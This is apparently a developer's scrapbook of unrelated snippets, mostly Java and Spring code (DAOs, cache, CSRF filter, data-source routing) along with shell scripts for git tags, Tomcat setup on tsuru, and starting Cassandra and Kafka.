        return;
    }

    public byte[] decode(byte[] src, final int length) 
    {
        if (length % 4 != 0)
            throw new IllegalArgumentException
            ("Input is expected to be encoded in multiple of 4 bytes but found: " + length);

        int pads=0;
        int last = length-1;
        
        // max possible padding in b64 encoding is 2
        for (; pads < 2 && last > -1; last--, pads++) {
            if (src[last] != PAD)
                break;
        }
        
        final int fq; // final quantum in unit of bytes
        
        switch(pads) {
            case 0:
                fq=3;
                break; // final quantum of encoding input is an integral multiple of 24 bits
            case 1:
                fq=2;
                break; // final quantum of encoding input is exactly 16 bits
            case 2:
                fq=1;
                break; // final quantum of encoding input is exactly 8 bits
            default:
                throw new Error("Impossible");
        }
        final byte[] dest = new byte[length / 4 * 3 - (3-fq)]; 
        int s=0, d=0;
        
        // % has a higher precedence than - than <
        for (; d < dest.length - fq%3; s+=4,d+=3)
            decode4bytes(src, s, dest, d);

        if (fq < 3)
            decode1to3bytes(fq, src, s, dest, d);
        return dest;
    }
    
    protected int pos(byte in) {
        int pos = LazyHolder.DECODED[in];
        
        if (pos > -1)
            return pos;
        throw new IllegalArgumentException("Invalid base 64 character: \'" + (char)in + "\'");
    }
}
-----------------------------------------------------------------------------------------
import java.util.concurrent.TimeUnit;
import javax.cache.CacheManager;

import org.ehcache.config.CacheConfiguration;
import org.ehcache.config.builders.CacheConfigurationBuilder;
import org.ehcache.config.builders.ResourcePoolsBuilder;
import org.ehcache.config.units.EntryUnit;
import org.ehcache.expiry.Duration;
import org.ehcache.expiry.Expirations;
import org.ehcache.jsr107.Eh107Configuration;

import org.springframework.boot.autoconfigure.cache.JCacheManagerCustomizer;
import org.springframework.cache.annotation.EnableCaching;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Profile;

/**
 * Cache could be disable in unit test.
 */
@Configuration
@EnableCaching
@Profile("production")
public class CacheConfig {

    @Bean
    public JCacheManagerCustomizer cacheManagerCustomizer() {
        return new JCacheManagerCustomizer() {
            @Override
            public void customize(CacheManager cacheManager) {
                CacheConfiguration<Object, Object> config = CacheConfigurationBuilder
                    .newCacheConfigurationBuilder(Object.class, Object.class,
                        ResourcePoolsBuilder.newResourcePoolsBuilder()
                            .heap(100, EntryUnit.ENTRIES))
                    .withExpiry(Expirations.timeToLiveExpiration(Duration.of(60, TimeUnit.SECONDS)))
                    .build();
                cacheManager.createCache("vets", Eh107Configuration.fromEhcacheCacheConfiguration(config));
            }
        };
    }

}
-----------------------------------------------------------------------------------------
# Usage: regenerate-tags filename
#
# filename must be line-separated pairs of <tag>,<commit description>
#
# delete all existing tags
git tag | xargs -L 1 | xargs git push origin --delete
git tag | xargs -L 1 | xargs git tag --delete

# read each line from file
file=$1
while IFS=',' read -r tag description
do
  echo $tag
  git log --branches=* --grep="^$description$" --pretty=format:"%h" | xargs git tag "$tag"
done < "$file"

# push tags to remote
git push --tags
-----------------------------------------------------------------------------------------
import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;
import org.springframework.batch.core.StepContribution;
import org.springframework.batch.core.scope.context.ChunkContext;
import org.springframework.batch.core.step.tasklet.Tasklet;
import org.springframework.batch.repeat.RepeatStatus;
import org.springframework.jdbc.core.JdbcTemplate;

public class HiveJdbcTasklet implements Tasklet {

	private static final Log log = LogFactory.getLog(HiveJdbcTasklet.class);

	private JdbcTemplate template;
	
	private String outputPath;
	
	public void setJdbcTemplate(JdbcTemplate template) {
		this.template = template;
	}

	public void setOutputPath(String outputPath) {
		this.outputPath = outputPath;
	}

	public RepeatStatus execute(StepContribution stepContribution, ChunkContext context)
			throws Exception {

		log.info("Hive JDBC Task Running");
		
		String tableDdl = "create external table if not exists tweetdata (value STRING) LOCATION '/tweets/input'";
		String query = "select r.retweetedUser, '\t', count(r.retweetedUser) as count " +
					" from tweetdata j " +
					" lateral view json_tuple(j.value, 'retweet', 'retweetedStatus') t as retweet, retweetedStatus " + 
					" lateral view json_tuple(t.retweetedStatus, 'fromUser') r as retweetedUser " +
					" where t.retweet = 'true' " +
					" group by r.retweetedUser order by count desc limit 10";
		String results = "insert overwrite directory '" + outputPath + "/hiveout'";
		
		template.execute(tableDdl);

		template.execute(results + " " + query);

		return null;
	}
}
-----------------------------------------------------------------------------------------
    public
    @Bean
    EntityManagerFactory customEntityManagerFactory(DataSource dataSource) {
        HibernateJpaVendorAdapter vendorAdapter = new HibernateJpaVendorAdapter();
        vendorAdapter.setGenerateDdl(false); // turn off with Discriminator strategy so far!
        LocalContainerEntityManagerFactoryBean factory = new LocalContainerEntityManagerFactoryBean();
        factory.setJpaVendorAdapter(vendorAdapter);
        factory.setPackagesToScan(TenancySampleApplication.class.getPackage().getName());
        factory.setDataSource(dataSource);
        factory.getJpaPropertyMap().put(Environment.DIALECT, PostgreSQL9Dialect.class.getName());
        factory.getJpaPropertyMap().put(Environment.MULTI_TENANT, MultiTenancyStrategy.DISCRIMINATOR);
        factory.getJpaPropertyMap().put(Environment.MULTI_TENANT_IDENTIFIER_RESOLVER, new TenantHolder());
        factory.afterPropertiesSet();
        return factory.getObject();
    }
-----------------------------------------------------------------------------------------
import org.springframework.security.web.csrf.CsrfToken;
import org.springframework.web.filter.OncePerRequestFilter;
import org.springframework.web.util.WebUtils;

import javax.servlet.FilterChain;
import javax.servlet.ServletException;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

/**
 * I got this code from here:
 * https://spring.io/guides/tutorials/spring-security-and-angular-js/
 */
public class CsrfHeaderFilter extends OncePerRequestFilter {
    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                    HttpServletResponse response, FilterChain filterChain)
            throws ServletException, IOException {
        CsrfToken csrf = (CsrfToken) request.getAttribute(CsrfToken.class
                .getName());
        if (csrf != null) {
            Cookie cookie = WebUtils.getCookie(request, "XSRF-TOKEN");
            String token = csrf.getToken();
            if (cookie==null || token!=null && !token.equals(cookie.getValue())) {
                cookie = new Cookie("XSRF-TOKEN", token);
                cookie.setPath("/");
                response.addCookie(cookie);
            }
        }
        filterChain.doFilter(request, response);
    }
}
-----------------------------------------------------------------------------------------
    public static String getRandomUsers() {
        final String words = "Andrea:Juan:Isaac:Sandra:Michael:Annabel";
        String[] wordsAsArray = words.split(":");
        int index = new Random().nextInt(wordsAsArray.length);

        return wordsAsArray[index];
    }
	
	import org.springframework.boot.builder.SpringApplicationBuilder;
import org.springframework.boot.web.support.SpringBootServletInitializer;

public class ServletInitializer extends SpringBootServletInitializer {

    @Override
    protected SpringApplicationBuilder configure(SpringApplicationBuilder application) {
        return application.sources(ExampleEnversApplication.class);
    }

}
-----------------------------------------------------------------------------------------
import org.springframework.hateoas.PagedResources;

import com.fasterxml.jackson.annotation.JsonIgnoreProperties;

@JsonIgnoreProperties
public class PagedCities extends PagedResources<City> {

}
-----------------------------------------------------------------------------------------

/**
 * Credits for this class goes to user aioobe on stackoverflow.com
 * Source: http://stackoverflow.com/questions/4454630/j2me-calculate-the-the-distance-between-2-latitude-and-longitude
 */
public class TrigMath {

    static final double sq2p1 = 2.414213562373095048802e0;
    static final double sq2m1 = .414213562373095048802e0;
    static final double p4 = .161536412982230228262e2;
    static final double p3 = .26842548195503973794141e3;
    static final double p2 = .11530293515404850115428136e4;
    static final double p1 = .178040631643319697105464587e4;
    static final double p0 = .89678597403663861959987488e3;
    static final double q4 = .5895697050844462222791e2;
    static final double q3 = .536265374031215315104235e3;
    static final double q2 = .16667838148816337184521798e4;
    static final double q1 = .207933497444540981287275926e4;
    static final double q0 = .89678597403663861962481162e3;
    static final double PIO2 = 1.5707963267948966135E0;

    private static double mxatan(double arg) {
        double argsq = arg * arg, value;

        value = ((((p4 * argsq + p3) * argsq + p2) * argsq + p1) * argsq + p0);
        value = value / (((((argsq + q4) * argsq + q3) * argsq + q2) * argsq + q1) * argsq + q0);
        return value * arg;
    }

    private static double msatan(double arg) {
        return arg < sq2m1 ? mxatan(arg)
             : arg > sq2p1 ? PIO2 - mxatan(1 / arg)
             : PIO2 / 2 + mxatan((arg - 1) / (arg + 1));
    }

    public static double atan(double arg) {
        return arg > 0 ? msatan(arg) : -msatan(-arg);
    }

    public static double atan2(double arg1, double arg2) {
        if (arg1 + arg2 == arg1)
            return arg1 >= 0 ? PIO2 : -PIO2;
        arg1 = atan(arg1 / arg2);
        return arg2 < 0 ? arg1 <= 0 ? arg1 + Math.PI : arg1 - Math.PI : arg1;
    }
}
-----------------------------------------------------------------------------------------
<img srcset="https://ik.imagekit.io/demo/resp-img/image1.jpg?tr=w-320,dpr-1 1x,
             https://ik.imagekit.io/demo/resp-img/image1.jpg?tr=w-320,dpr-2 2x,
             https://ik.imagekit.io/demo/resp-img/image1.jpg?tr=w-320,dpr-3 3x" 
      src="https://ik.imagekit.io/demo/resp-img/image1.jpg?tr=w-320,dpr-3" 
      alt="DPR responsive image tag" />
	  
<picture>
    <source media="(min-width: 1081px)" srcset="https://ik.imagekit.io/demo/resp-img/image1.jpg?tr=w-800">
    <source media="(min-width: 721px)" srcset="https://ik.imagekit.io/demo/resp-img/image1.jpg?tr=w-500,h-400,fo-auto">
    <img src="https://ik.imagekit.io/demo/resp-img/image1.jpg?tr=w-320,h-320,fo-auto" />
</picture>	  
-----------------------------------------------------------------------------------------
npm install -g native-css
npm install native-css

native-css <input> <output>
-----------------------------------------------------------------------------------------
    @RequestMapping(value="/login.htm", method = RequestMethod.GET)
    public String chamarLogin(@ModelAttribute("login") Login login, HttpSession session){
        
        byte[] bytes  = Base64.getEncoder().encode("geraldo".getBytes());
        
         String token = (String) session.getAttribute("token");
        
        if(token!=null && token.equals("aprovado")){
            return "index";
        }
        
        return"login";
    }
-----------------------------------------------------------------------------------------
import java.util.ArrayList;
import java.util.List;
import javax.persistence.EntityManager;
import javax.persistence.EntityManagerFactory;
import javax.persistence.Persistence;
import modelo.Autor;
import modelo.Editora;
import modelo.Livro;

/**
 *
 * @author DesenvolvedorJava
 */
public class LivrariaDao
{
    
    public void cadastrarAutor(Autor autor){
        EntityManagerFactory factory = 
                Persistence.createEntityManagerFactory("PersistSpring");
        
        EntityManager em = factory.createEntityManager();
        em.getTransaction().begin();
        em.persist(autor);
        em.getTransaction().commit();
        em.close();
    }
    
    public void cadastrarEditora(Editora editora){
        EntityManagerFactory factory = 
                Persistence.createEntityManagerFactory("PersistSpring");
        
        EntityManager em = factory.createEntityManager();
        em.getTransaction().begin();
        em.persist(editora);
        em.getTransaction().commit();
        em.close();
    }
    
    public List<Editora> listarEditora(){
               EntityManagerFactory factory = 
                Persistence.createEntityManagerFactory("PersistSpring");
        EntityManager em = factory.createEntityManager();
        em.getTransaction().begin();
        List<Editora> listaEditora = em.createQuery("select e from Editora as e").getResultList();
        em.close();
        factory.close();
        return listaEditora;
    }
    
    public void cadastrarLivro(Livro livro){
        EntityManagerFactory factory = 
                Persistence.createEntityManagerFactory("PersistSpring");
        EntityManager em = factory.createEntityManager();
        em.getTransaction().begin();
        em.persist(livro);
        em.getTransaction().commit();
        em.close();
        factory.close();
    }
    
    public List<Autor> listarAutor(){
               EntityManagerFactory factory = 
                Persistence.createEntityManagerFactory("PersistSpring");
        EntityManager em = factory.createEntityManager();
        em.getTransaction().begin();
        List<Autor> listaAutor = em.createQuery("select a from Autor as a").getResultList();
        em.close();
        factory.close();
        return listaAutor;
    }
    
    public List<Livro> listarLivro(){
        EntityManagerFactory factory = 
                Persistence.createEntityManagerFactory("PersistSpring");
        
        EntityManager em = factory.createEntityManager();
        em.getTransaction().begin();
        List<Livro> listaLivro = em.createQuery("select l from Livro as l").getResultList();
        em.close();
        factory.close();
        return listaLivro;
    }
    
    public Livro verLivro(int idlivro){
        EntityManagerFactory factory = 
                Persistence.createEntityManagerFactory("PersistSpring");
        
        EntityManager em = factory.createEntityManager();
        em.getTransaction().begin();
        Livro livro = em.find(Livro.class, idlivro);
        em.close();
        factory.close();
        return livro;
    }
    
    public void excluirLivro(int idlivro){
        EntityManagerFactory factory = 
                Persistence.createEntityManagerFactory("PersistSpring");
        
        EntityManager em = factory.createEntityManager();
        em.getTransaction().begin();
        Livro livro = em.find(Livro.class, idlivro);
        em.remove(livro);
        em.getTransaction().commit();
        em.close();
        factory.close();
    }
    
    
    public void atualizarLivro(Livro livro){
        EntityManagerFactory factory = 
                Persistence.createEntityManagerFactory("PersistSpring");
        
        EntityManager em = factory.createEntityManager();
        em.getTransaction().begin();
        em.merge(livro);
        em.getTransaction().commit();
        em.close();
        factory.close();
    }
    
}
import javax.persistence.EntityManager;
import javax.persistence.EntityManagerFactory;
import javax.persistence.Persistence;
import modelo.Login;

/**
 *
 * @author DesenvolvedorJava
 */
public class LoginDao {
    
    public void cadastrarLogin(Login login){
        EntityManagerFactory factory = 
                Persistence.createEntityManagerFactory("PersistSpring");
        
        EntityManager em = factory.createEntityManager();
        em.getTransaction().begin();
        em.persist(login);
       
        em.getTransaction().commit();
        em.close();
    }
    
    public boolean validarUsuario(Login login){
        EntityManagerFactory factory = 
                Persistence.createEntityManagerFactory("PersistSpring");
        
        EntityManager em = factory.createEntityManager();
        em.getTransaction().begin();
        
        Login l = em.find(Login.class, login.getLogin());
        em.close();
        if(l != null && l.getSenha().equals(login.getSenha())){
            return true;
        }
        
        return false;
    }
    
}

tsuru-admin platform-add <platform-name>


#!/bin/bash -e

# Copyright 2015 tsuru authors. All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE file.

SOURCE_DIR=/var/lib/tsuru

source ${SOURCE_DIR}/base/rc/config

apt-get update
apt-get install -y openjdk-7-jdk maven tomcat7

cp $SOURCE_DIR/java/Procfile $SOURCE_DIR/default/Procfile

rm -rf /var/lib/tomcat7/webapps
ln -s ${CURRENT_DIR} /var/lib/tomcat7/webapps
mkdir -p /usr/share/tomcat7/common/classes /usr/share/tomcat7/server/classes /usr/share/tomcat7/shared/classes
chown -R ${USER}:${USER} /etc/tomcat7 /var/lib/tomcat7 /var/cache/tomcat7 /var/log/tomcat7 /usr/share/tomcat7
sed -i 's/8080/8888/' /etc/tomcat7/server.xml



https://github.com/raphamorim/platforms

https://github.com/raphamorim/tsuru.io
-----------------------------------------------------------------------------------------
  
#!/usr/bin/env bash

if [ -z ${CASSANDRA_VERSION+x} ]; then
    CASSANDRA_VERSION=3.0.7
fi

if [[ ! -d download ]] ; then
    mkdir -p download
fi

FILENAME="apache-cassandra-${CASSANDRA_VERSION}-bin.tar.gz"

echo "[INFO] Downloading ${FILENAME}"
if [[ ! -f download/${FILENAME} ]] ; then
    mkdir -p download
    wget https://archive.apache.org/dist/cassandra/${CASSANDRA_VERSION}/${FILENAME} -O download/${FILENAME}
    if [[ $? != 0 ]] ; then
        echo "[ERROR] Download failed"
        exit 1
    fi
fi


if [[ ! -d work ]] ; then
    mkdir -p work
fi

BASENAME=apache-cassandra-${CASSANDRA_VERSION}
if [[ ! -d work/${BASENAME} ]] ; then

    echo "[INFO] Extracting ${FILENAME}"
    mkdir -p work/${BASENAME}
    cd work

    tar xzf ../download/${FILENAME}
    if [[ $? != 0 ]] ; then
        echo "[ERROR] Extraction failed"
        exit 1
    fi
    cd ..
fi

cd work/${BASENAME}

echo "[INFO] Cleaning data directory"
rm -Rf data
mkdir -p data

echo "[INFO] Starting Apache Cassandra ${CASSANDRA_VERSION}"
export MAX_HEAP_SIZE=1500M
export HEAP_NEWSIZE=300M
bin/cassandra

for start in {1..20}
do
    nc  -w 1 localhost 9042 </dev/null
    if [[ $? == 0 ]] ; then
        echo "[INFO] Cassandra is up and running"
        cd ../..
        exit 0
    fi
    sleep 1
done

echo "[ERROR] Cannot connect to Cassandra"
exit 1

-----------------------------------------------------------------------------------------
        <dependency>
            <groupId>net.thucydides</groupId>
            <artifactId>thucydides-jbehave-plugin</artifactId>
            <version>0.9.275</version>
        </dependency>
-----------------------------------------------------------------------------------------
#!/bin/sh
# Parts of this file come from:
# http://en.wikibooks.org/wiki/Clojure_Programming/Getting_Started#Create_clj_Script 

BREAK_CHARS="\(\){}[],^%$#@\"\";:''|\\"
CLOJURE_DIR=/usr/local/lib/clojure
CLOJURE_JAR=$CLOJURE_DIR/clojure.jar
CLASSPATH="$CLOJURE_DIR/*:$CLOJURE_JAR"

while [ $# -gt 0 ]
do
    case "$1" in
    -cp|-classpath)
            CLASSPATH="$CLASSPATH:$2"
    shift ; shift
    ;;
-e) tmpfile="/tmp/`basename $0`.$$.tmp"
    echo "$2" > "$tmpfile"
    shift ; shift
    set "$tmpfile" "$@"
    break # forces any -cp to be before any -e
    ;;
*)  break
    ;;
esac
done

if [ $# -eq 0 ]
then
  exec rlwrap --remember -c -b $BREAK_CHARS \
          java -cp $CLASSPATH clojure.main
else
  exec java -cp $CLASSPATH clojure.main $1 -- "$@"
fi
-----------------------------------------------------------------------------------------
import java.util.List;

import org.springframework.data.cassandra.core.mapping.MapId;
import org.springframework.data.cassandra.core.mapping.Table;
import org.springframework.data.cassandra.core.query.CassandraPageRequest;
import org.springframework.data.domain.Pageable;
import org.springframework.data.domain.Persistable;
import org.springframework.data.domain.Slice;
import org.springframework.data.repository.CrudRepository;
import org.springframework.data.repository.NoRepositoryBean;

/**
 * Cassandra-specific extension of the {@link CrudRepository} interface that allows the specification of a type for the
 * identity of the {@link Table @Table} (or {@link Persistable @Persistable}) type.
 * <p />
 * Repositories based on {@link CassandraRepository} can define either a single primary key, use a primary key class or
 * a compound primary key without a primary key class. Types using a compound primary key without a primary key class
 * must use {@link MapId} to declare their key value.
 *
 * @author Alex Shvid
 * @author Matthew T. Adams
 * @author Mark Paluch
 * @see MapIdCassandraRepository
 */
@NoRepositoryBean
public interface CassandraRepository<T, ID> extends CrudRepository<T, ID> {

	/* (non-Javadoc)
	 * @see org.springframework.data.repository.CrudRepository#saveAll(java.lang.Iterable)
	 */
	@Override
	<S extends T> List<S> saveAll(Iterable<S> entites);

	/* (non-Javadoc)
	 * @see org.springframework.data.repository.CrudRepository#findAll()
	 */
	@Override
	List<T> findAll();

	/**
	 * {@inheritDoc}
	 * <p/>
	 * Note: Cassandra supports single-field {@code IN} queries only. When using {@link MapId} with multiple components,
	 * use {@link #findById(Object)}.
	 *
	 * @throws org.springframework.dao.InvalidDataAccessApiUsageException thrown when using {@link MapId} with multiple
	 *           key components.
	 */
	@Override
	List<T> findAllById(Iterable<ID> ids);

	/**
	 * Returns a {@link Slice} of entities meeting the paging restriction provided in the {@code Pageable} object.
	 *
	 * @param pageable must not be {@literal null}.
	 * @return a {@link Slice} of entities.
	 * @see CassandraPageRequest
	 * @since 2.0
	 */
	Slice<T> findAll(Pageable pageable);

	/**
	 * Inserts the given entity. Assumes the instance to be new to be able to apply insertion optimizations. Use the
	 * returned instance for further operations as the save operation might have changed the entity instance completely.
	 * Prefer using {@link #save(Object)} instead to avoid the usage of store-specific API.
	 *
	 * @param entity must not be {@literal null}.
	 * @return the saved entity
	 * @since 2.0
	 */
	<S extends T> S insert(S entity);

	/**
	 * Inserts the given entities. Assumes the given entities to have not been persisted yet and thus will optimize the
	 * insert over a call to {@link #saveAll(Iterable)}. Prefer using {@link #saveAll(Iterable)} to avoid the usage of
	 * store specific API.
	 *
	 * @param entities must not be {@literal null}.
	 * @return the saved entities
	 * @since 2.0
	 */
	<S extends T> List<S> insert(Iterable<S> entities);

}

			<!-- Cassandra Driver -->
			<dependency>
				<groupId>com.datastax.cassandra</groupId>
				<artifactId>cassandra-driver-core</artifactId>
				<version>${cassandra-driver.version}</version>
			</dependency>
			
						<dependency>
				<groupId>org.apache.cassandra</groupId>
				<artifactId>cassandra-all</artifactId>
				<version>${cassandra.version}</version>
				<scope>test</scope>
				<exclusions>
					<exclusion>
						<groupId>ch.qos.logback</groupId>
						<artifactId>logback-core</artifactId>
					</exclusion>
					<exclusion>
						<artifactId>guava</artifactId>
						<groupId>com.google.guava</groupId>
					</exclusion>
					<exclusion>
						<groupId>io.netty</groupId>
						<artifactId>netty-all</artifactId>
					</exclusion>
				</exclusions>
			</dependency>
			
			
					<plugin>
				<groupId>org.bitstrings.maven.plugins</groupId>
				<artifactId>dependencypath-maven-plugin</artifactId>
				<version>1.1.1</version>
				<executions>
					<execution>
						<id>set-all</id>
						<goals>
							<goal>set</goal>
						</goals>
					</execution>
				</executions>
			</plugin>
			
						<plugin>
				<groupId>org.apache.maven.plugins</groupId>
				<artifactId>maven-surefire-plugin</artifactId>
				<configuration>
					<parallel>methods</parallel>
					<threadCount>10</threadCount>
					<useFile>false</useFile>
					<includes>
						<include>**/test/unit/**/*</include>
						<include>**/*UnitTests</include>
					</includes>
					<excludes>
						<exclude>**/test/integration/**/*.java</exclude>
						<exclude>**/**IntegrationTests</exclude>
						<exclude>**/test/performance/**/*</exclude>
					</excludes>
					<systemPropertyVariables>
						<java.util.logging.config.file>src/test/resources/logging.properties</java.util.logging.config.file>
					</systemPropertyVariables>
				</configuration>
			</plugin>
			
					<plugin>
				<groupId>org.apache.maven.plugins</groupId>
				<artifactId>maven-failsafe-plugin</artifactId>
				<configuration>
					<forkCount>1</forkCount>
					<argLine>-Xms1g -Xmx1500m -Xss256k</argLine>
					<reuseForks>true</reuseForks>
					<useFile>false</useFile>
					<includes>
						<include>**/test/integration/**/*</include>
						<include>**/*IntegrationTests</include>
					</includes>
					<excludes>
						<exclude>**/test/unit/**/*</exclude>
						<exclude>**/*UnitTests</exclude>
						<exclude>**/test/performance/**/*</exclude>
					</excludes>
					<systemPropertyVariables>
						<java.util.logging.config.file>src/test/resources/logging.properties</java.util.logging.config.file>
					</systemPropertyVariables>
				</configuration>
				<executions>
					<execution>
						<goals>
							<goal>integration-test</goal>
							<goal>verify</goal>
						</goals>
					</execution>
				</executions>
			</plugin>
-----------------------------------------------------------------------------------------
public class <T extends Self<T>> Self<T> {
    public T someMethodThatReturnsSelf() {
        return (T) this; //yeah, this ugly and generates warnings, but it does work.
    }
}
-----------------------------------------------------------------------------------------
https://github.com/yildirimabdullah/spring-kafka-test
https://mguenther.github.io/kafka-junit/
-----------------------------------------------------------------------------------------
techio.yml

  
title: More complex modelling with Spring Data Cassandra
plan:
- title: More complex modelling with Spring Data Cassandra
  statement: markdowns/welcome.md
projects:
  java:
    root: /java-project
    runner:
      name: techio/java-maven3-junit4-runner
      version: 1.1.4-java-8
-----------------------------------------------------------------------------------------
import lankydan.tutorial.documents.OrderTransaction;
import lankydan.tutorial.repositories.OrderTransactionRepository;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.jms.annotation.JmsListener;
import org.springframework.stereotype.Component;

@Component
public class OrderTransactionReceiver {

  @Autowired private OrderTransactionRepository transactionRepository;

  private int count = 1;

  @JmsListener(destination = "OrderTransactionQueue", containerFactory = "myFactory")
  public void receiveMessage(OrderTransaction transaction) {
    System.out.println("<" + count + "> Received <" + transaction + ">");
    count++;
    //    throw new RuntimeException();
    transactionRepository.save(transaction);
  }
}

https://ssh.cloud.google.com/cloudshell/editor
cloudshell_open --repo_url "https://github.com/GoogleCloudPlatform/DataflowTemplates.git" --page "editor"
-----------------------------------------------------------------------------------------
https://github.com/apache/incubator-druid
----------------------------------------------------------------------------------------
Start Zookeeper

./bin/zookeeper-server-start.sh config/zookeeper.properties
Start Kafka

./bin/kafka-server-start.sh config/server.properties
Create topic

./bin/kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic example
----------------------------------------------------------------------------------------
import static java.util.Objects.requireNonNull;

import java.lang.reflect.ParameterizedType;

import javax.persistence.EntityManager;
import javax.persistence.LockModeType;
import javax.persistence.PersistenceContext;

import org.springframework.orm.ObjectRetrievalFailureException;

import ddd.domain.Repository;

public class GenericJpaRepository<E, K> implements Repository<E, K> {

	@PersistenceContext
	private EntityManager entityManager;

	private Class<E> entityClass;

	@SuppressWarnings("unchecked")
	public GenericJpaRepository() {
		this.entityClass = ((Class<E>) ((ParameterizedType) getClass().getGenericSuperclass()).getActualTypeArguments()[0]);
	}

	@Override
	public E load(K id) {
		requireNonNull(id);

		E entity = entityManager.find(entityClass, id, LockModeType.OPTIMISTIC);

		if (entity == null) {
			throw new ObjectRetrievalFailureException(entityClass, id);
		}

		return entity;
	}

	@Override
	public void save(E entity) {
		requireNonNull(entity);

		if (entityManager.contains(entity)) {
			entityManager.lock(entity, LockModeType.OPTIMISTIC_FORCE_INCREMENT);
		} else {
			entityManager.persist(entity);
		}

		entityManager.flush();
	}

	@Override
	public void delete(E entity) {
		requireNonNull(entity);

		entityManager.remove(entity);
		entityManager.flush();
	}

}

import org.springframework.context.annotation.ComponentScan;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.EnableAspectJAutoProxy;

@Configuration
@ComponentScan
@EnableAspectJAutoProxy
public class DddConfig {
}

@Override
	public void onStartup(ServletContext servletContext) throws ServletException {
		AnnotationConfigWebApplicationContext rootContext = new AnnotationConfigWebApplicationContext();
		rootContext.register(ScrumBoardConfig.class);

		servletContext.addListener(new ContextLoaderListener(rootContext));

		registerDispatcherServlet(servletContext, rootContext);
		registerH2WebServlet(servletContext);

		registerHttpPutContentFilter(servletContext);
	}
	
	import static java.util.Objects.requireNonNull
import example.ddd.Event
import example.scrumboard.domain.backlogitem.BacklogItemId
import groovy.transform.Immutable
import groovy.transform.TypeChecked

@Immutable(knownImmutableClasses = [ProductId.class, BacklogItemId.class])
@TypeChecked
class BacklogItemPlannedEvent implements Event {
	ProductId productId
	BacklogItemId backlogItemId
}


import static java.util.Objects.requireNonNull;

import java.lang.reflect.ParameterizedType;

import javax.persistence.EntityManager;
import javax.persistence.LockModeType;
import javax.persistence.PersistenceContext;

import org.springframework.orm.ObjectRetrievalFailureException;

import example.ddd.AggregateRoot;
import example.ddd.Repository;

public class GenericJpaRepository<E extends AggregateRoot<K>, K> implements Repository<E, K> {

	@PersistenceContext
	private EntityManager entityManager;

	private Class<E> entityClass;

	@SuppressWarnings("unchecked")
	public GenericJpaRepository() {
		this.entityClass = ((Class<E>) ((ParameterizedType) getClass().getGenericSuperclass()).getActualTypeArguments()[0]);
	}

	@Override
	public E load(K id) {
		requireNonNull(id);

		E entity = entityManager.find(entityClass, id, LockModeType.OPTIMISTIC);

		if (entity == null) {
			throw new ObjectRetrievalFailureException(entityClass, id);
		}

		return entity;
	}

	@Override
	public void save(E entity) {
		requireNonNull(entity);

		if (entityManager.contains(entity)) {
			entityManager.lock(entity, LockModeType.OPTIMISTIC_FORCE_INCREMENT);
		} else {
			entityManager.persist(entity);
		}

		entityManager.flush();
	}

	@Override
	public void delete(E entity) {
		requireNonNull(entity);

		entityManager.remove(entity);
		entityManager.flush();
	}

	protected Class<E> getEntityClass() {
		return entityClass;
	}

	protected EntityManager getEntityManager() {
		return entityManager;
	}

}
----------------------------------------------------------------------------------------
import lombok.extern.slf4j.Slf4j;
import org.springframework.boot.autoconfigure.SpringBootApplication;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration;
import org.springframework.boot.autoconfigure.orm.jpa.HibernateJpaAutoConfiguration;
import org.springframework.boot.web.support.SpringBootServletInitializer;
import org.springframework.context.ConfigurableApplicationContext;

@Slf4j
@SpringBootApplication(exclude={DataSourceAutoConfiguration.class,HibernateJpaAutoConfiguration.class})
public class MiCommonApplication extends SpringBootServletInitializer {


	public static void main(String[] args) {
		ConfigurableApplicationContext context =  SpringApplication.run(MiCommonApplication.class, args);
		String[] activeProfiles = context.getEnvironment().getActiveProfiles();
		for (String profile : activeProfiles){
			log.info("String active profile:{}" ,profile);
		}
		log.info("应用程序启动完毕");
	}
}

    /**
     * 主库配置（负责写）
     * @return
     */
    @Bean(name="masterDataSource", destroyMethod = "close", initMethod="init")
    @Primary
    @ConfigurationProperties(prefix = "spring.datasource",locations = "classpath:application.properties")
    public DataSource writeDataSource() {
        log.info("-------------------- Master DataSource init ---------------------");
        return DataSourceBuilder.create().type(dataSourceType).build();
    }
    /**
     * 从库配置（负责读）
     * @return
     */
    @Bean(name = "slaveDataSourceOne")
    @ConfigurationProperties(prefix = "spring.slave",locations = "classpath:application.properties")
    public DataSource readDataSourceOne(){
        log.info("-------------------- Slave DataSource One init ---------------------");
        
		
		
		import org.springframework.jdbc.datasource.lookup.AbstractRoutingDataSource;

import java.util.concurrent.atomic.AtomicInteger;

/**
 * 多数据源切换
 * @author yesh
 *         (M.M)!
 *         Created by 2017/6/16.
 */
public class MyAbstractRoutingDataSource extends AbstractRoutingDataSource {

    private final int dataSourceNumber;

    private AtomicInteger count = new AtomicInteger(0);

    public MyAbstractRoutingDataSource(int dataSourceNumber) {
        this.dataSourceNumber = dataSourceNumber;
    }

    @Override
    protected Object determineCurrentLookupKey() {
        String typeKey = DataSourceContextHolder.getJdbcType();
        //配置MyBatis后
        //determineTargetDataSource中默认跑了determineCurrentLookupKey方法
        //若为空设置为主库（写）
        if (typeKey == null){
            return DataSourceType.write.getType();
        }
        else if (typeKey.equals(DataSourceType.write.getType())){
            return DataSourceType.write.getType();
        }

        // 不为则为分库（读） 简单负载均衡
        int number = count.getAndAdd(1);
        int lookupKey = number % dataSourceNumber;
        return new Integer(lookupKey);
    }
}

import com.baomidou.mybatisplus.MybatisConfiguration;
import com.baomidou.mybatisplus.MybatisXMLLanguageDriver;
import com.baomidou.mybatisplus.entity.GlobalConfiguration;
import com.baomidou.mybatisplus.enums.DBType;
import com.baomidou.mybatisplus.plugins.PaginationInterceptor;
import com.baomidou.mybatisplus.spring.MybatisSqlSessionFactoryBean;
import lombok.extern.slf4j.Slf4j;
import org.apache.ibatis.mapping.DatabaseIdProvider;
import org.apache.ibatis.plugin.Interceptor;
import org.mybatis.spring.annotation.MapperScan;
import org.mybatis.spring.boot.autoconfigure.MybatisProperties;
